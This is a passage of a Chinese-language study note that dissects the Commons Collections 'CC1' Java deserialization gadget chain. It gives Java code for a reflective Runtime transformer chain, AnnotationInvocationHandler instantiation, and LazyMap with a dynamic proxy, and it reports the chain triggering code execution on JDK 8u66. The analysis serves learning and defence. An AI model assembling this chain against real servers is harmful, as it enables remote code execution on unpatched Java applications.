//        Transformer[] transformers={
//            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer
传进去一个对象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入
一个对象。
//            invokerTransformer}; //此处因为Runtime类没有实现serializable接口，所以无
法被反序列化，需要修改链。
        Transformer[] transformers={
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]
{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),//通过
InvokerTransformer方法获取getRuntime方法
            new InvokerTransformer("invoke",new Class[]
{Object.class,Object[].class},new Object[]{null,new Object[0]}),
            invokerTransformer,
            new ConstantTransformer(1),
        };
        ChainedTransformer chainedTransformer = new 
ChainedTransformer(transformers);
        chainedTransformer.transform("");
   }
}
关于AnnotationInvocationHandler
在通过var5.setValue的过程就会像我们之前分析的一样，有一个通过 outermap 进行添加元素的操作。
仔细分析一下。
AnnotationInvocationHandler的调用与初始化
AnnotationInvocationHandler 是JDK的内部类，不能通过new的方式来进行创建，所以此处使用java
反射的方式进行调用。
version:8u66
private void readObject(ObjectInputStream var1) throws IOException, 
ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;
        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation 
serial stream");
        }
        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();
        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) 
{
                    var5.setValue((new 
AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + 
"]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
    }
Class aClass = 
Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = aClass.getDeclaredConstructor(Class.class, 
Map.class);
        constructor.setAccessible(true);
        //Object obj = constructor.newInstance(Retention.class, outerMap);
        //Retention.class;
        InvocationHandler handler= 
(InvocationHandler)constructor.newInstance(Counter.class, outerMap);
第二部分，就是关于调用 newInstance 进行初始化。在这一步中，需要来阅读
AnnotationInvocationHandler 源码查看如何进行初始化。
首先传递两个参数 var1 和 Map ，其中这个 var1 是一个Class类型且必须继承 Annotation 类。这里的
Annotation 类就是java的注解了，java中所有的注解都继承自该类。且该类是个接口类型，无法直接创
建子类。而且无法通过实现该接口，再继承的方式去实现。
也就是这种方式创建是无法完成初始化的。
这里可以直接自定义一个注解，因为每一个注解都继承自 Annotation 类。
之后通过 getInterfaces() 方法获取到 var1 所实现的第一个接口对象。然后使用 isAnnotation 方法
检查 var1 是不是 Annotation 注解类型，并判断获取到的第一个接口对象是不是 Annotation 类型。之
后将 AnnotationInvocationHandler 类的 type 属性赋值 var1 ， memberValues 属性赋值 var2 。 
AnnotationInvocationHandler的反序列化
    AnnotationInvocationHandler(Class var1, Map var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == 
Annotation.class) {
            this.type = var1;
            this.memberValues = var2;
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-
annotation type.");
        }
    }
class a implements Annotation{
    @Override
    public Class annotationType() {
        return null;
    }
}
class b extends a{}
上图， readObject 方法 
首先是创建一个 AnnotionType 类型的变量 var2 ，然后通过 AnnotionType.getInstance 方法获取到
this.type 的Class类对象。这里的 this.type 属性根据之前的分析，就是我们传递的第一个变量，一
个 interface SecurityRambling.Counter 。这里的使用的 AnnotationType.getInstance 方法作用
是获取注解类本身。
详细信息：AnnotationType类型介绍 
之后可以看到获取到的 var2 变量的属性，其中 memberTypes 属性中保存的是当前注解拥有的方法。是
一个 HashMap 类型。
@interface Counter {
    test count();
    String a();
}
enum test{
    CLASS,
    SOURCE,
    RUNTIME,
}
之后将 memberTypes 属性的值赋值给 var3 ，然后创建一个迭代器，迭代器的内容就是之前存入的
TransformedMap 类型的值。 
之后继续，对迭代器进行遍历。
此处可以看到，首先从迭代器取出一个值，赋值给 var5 ，然后获取到 var5 的键为 demo ，之后在 var3
中寻找键名为 demo 的值，这个 var3 存放的当前注解所有的接口方法。而当前接口没有一个名为 demo
的方法，因此 var7 为null，然后跳过 setValue 的步骤。直接返回。 
此处我们要想 var7 不为null，就必须在生成序列化链的时候，通过 outermap 存入一个键值，且键名必
须为 AnnotationInvocationHandler 类初始化时传进去的注解的其中一个方法名。所以构造链应该如
下：
继续调试。
此时 var7 不为null，进入到if结构当中，然后获取到 var5 的值，赋值给 var8 ，可以看到 var8 为int类
型的1，这个值与我们构造链中的最后一次创建 ConstantTransformer 对象传递的值有关系，是我们可
以人为控制的。然后通过两个判断，根据逻辑两个判断都必须为false，才能进入到 setValue 方法。
第一个判断：
java.lang.Class类的isInstance()方法用于检查指定的对象是否兼容分配给该Class的实例。如果指定
对象为非null，并且可以强制转换为此类的实例，则该方法返回true。否则返回false。
用法:
public boolean isInstance(Object object)
参数：此方法接受object作为参数，这是要检查与此Class实例的兼容性的指定对象。
返回值：如果指定对象为非null，并且可以强制转换为此类的实例，则此方法返回true。否则返回false
第二个判断
instanceof 严格来说是Java中的一个双目运算符，用来测试一个对象是否为一个类的实例
此处 var7 为 String 类型， var8 为 Integer 类型，两个判断都为False，进入到 setValue 方法。进
入 setValue 方法之后还有一系列的操作，最后在此处产生了类似 outerMap.put() 的操作，并触发构
造链。
到此，整个构造链第一部分的分析结束。
LazyMap代替TransformedMap
原因
在高版本中 AnnotationInvocationHandler 类中的readObject方法被修改了，使用重新生成的
LinkHashMap来进行数据操作，因此反序列化的过程中不会再触发put的操作。 
所以在yso中使用 LazyMap 对 TransformedMap 进行替换。
LazyMap
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
    private static final long serialVersionUID = 7990956402564206740L;
    protected final Transformer factory;
    public static Map decorate(Map map, Factory factory) {
        return new LazyMap(map, factory);
LazyMap 也是通过 decorate 方法在创建对象的时候将 factory 属性赋值为 chainedTransformer ，之
后通过 get 方法获取一个不存在的键值对时就会通过 factory 方法去获取一个值，也就是在这个地方可
以触发构造链。
    }
    public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }
    protected LazyMap(Map map, Factory factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = FactoryTransformer.getInstance(factory);
        }
    }
    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = factory;
        }
    }
    private void readObject(ObjectInputStream in) throws IOException, 
ClassNotFoundException {
        in.defaultReadObject();
        super.map = (Map)in.readObject();
    }
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
}
找到了 LazyMap 触发构造链的点，之后要考虑如何在反序列化的时候执行这个 get 方法，还是利用
AnnotationInvocationHandler 类，但是这个类的 readObject 方法是没有触发 get 方法的操作的。
但是 invoke() 方法中有一个 get 的操作。 
那么问题就转移到如何在反序列化的过程中执行这个 invoke 方法。
Java对象代理
详细可以看java代理类的学习。
自定义一个handle继承自InvocationHandler，然后实现invoke方法，劫持get方法的执行流程。
class Handle implements InvocationHandler{
    protected  Map map;
    public Handle(Map map) {
        this.map = map;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws 
Throwable {
        if(method.getName().equals("get")){
            System.out.println("正在调用get方法"); //通过此次劫持get执行流程。
            return "hack job";
        }
        return method.invoke(map,args);
    }
}
重回LazyMap
还是来关注 sun.reflect.annotation.AnnotationInvocationHandler 类，可以发现他是一个本身就
实现了InvocationHandle接口的类，实现了 invoke 方法，那么我们只要创建一个 outerMap 的代理
类， handler 参数传递为 sun.reflect.annotation.AnnotationInvocationHandler ,那么我们就可
以劫持 outerMap 执行 get 方法的流程。 
        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        //outerMap.get(1);
        //生成动态代理对象
        Map proxyInstance = (Map)Proxy.newProxyInstance(
            Map.class.getClassLoader(),
            new Class[]{Map.class},
            new Handle(outerMap)
        );
        outerMap.put("hello","world");
        Object hello = proxyInstance.get("hello");
        System.out.println(hello);
所以整个调用构造链的方法修改为如下形式：
        Class aClass = 
Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = aClass.getDeclaredConstructor(Class.class, 
Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) 
constructor.newInstance(Counter.class, outerMap);
        Map proxyMap =(Map) Proxy.newProxyInstance(
            Map.class.getClassLoader(),
            new Class[]{Map.class},
            handler  //将handler传递进去，之后
sun.reflect.annotation.AnnotationInvocationHandler方法就会劫持原本的get方法。
        );
        proxyMap.entrySet();//
最开始使用 proxyMap.get(1) 的方式来触发 invoke ，但是一直报错。 
这个错误是在 invoke 方法中触发的，因为传递的是一个有参方法，经过 getParameterTypes 获取参数
类型的时候不为0，所以直接抛出异常。改为无参的方法再劫持就能成功触发构造链了。 
经过劫持之后， outerMap 对象已经变成了 proxyMap 对象了，现在就是要想办法再 readObject 方法中
让这个proxyMap调用一个无参方法，就可以完成整个构造链。回到
sun.reflect.annotation.AnnotationInvocationHandler 类的 readObject 方法当中。 
在readObject方法当中通过获取到 memberValues 属性值，赋值给 var4 ，然后 var4 也调用了一个无参
的方法。所以这个readObject本身就可以满足要求，所以再创建一个 AnnotationInvocationHandler
对象，然后将其序列化就可以满足要求。
构造链调试和疑问
1、在jdk1.8.0_131中直接报错。在jdk1.8.0_66中成功弹计算机。 
因为jdk版本跟新之后修改了 AnnotationInvocationHandler 的 readObject 方法，将其中的
memberValue 变量进行了修改，所以在劫持内部过程，执行 invoke 函数的时候 this.memberValue 不
再是 LazyMap ： 
2、序列化的过程中序列化了两个 AnnotationInvocationHandler 对象，所以反序列化时会触发两次
readObjet方法。使用两次不一样的注解，清楚的看到两次反序列化。 
第一次：
第二次：